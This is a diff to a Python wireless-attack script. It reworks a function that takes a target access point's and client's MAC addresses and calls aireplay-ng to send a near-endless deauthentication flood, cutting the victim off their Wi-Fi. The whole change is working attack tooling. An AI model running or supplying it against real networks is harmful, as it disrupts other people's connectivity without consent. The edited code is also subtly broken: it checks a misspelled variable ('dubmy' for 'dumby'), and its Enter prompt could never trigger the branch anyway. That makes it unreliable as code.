@@ -399,11 +399,15 @@ def invalid():
     exit()
 def deauth():
     Intff = getinterf()
-    routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
-    climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
-    #packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
-    print("\n [Info] --> the attack is in action, if you want to stop the attack please press on the left \"ctrl+c\" buttons ")
-    subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff])
+    print("\n [Instruction] --> 1- You need to run \"airodump-ng\" against the targeted network\n")
+    dumby = input(" [Waiting] --> Press Enter when you are ready ")
+    if dubmy:
+        routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
+        climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
+        #packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
+        print("\n [Info] --> the attack is in action, if you want to stop the attack please press on the left \"ctrl+c\" buttons \n\n\n")
+        time.sleep(2)
+        subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff])
 def lines():
     print("-------------------------------------------------------------------------------------------------------")
 def TheEnd():
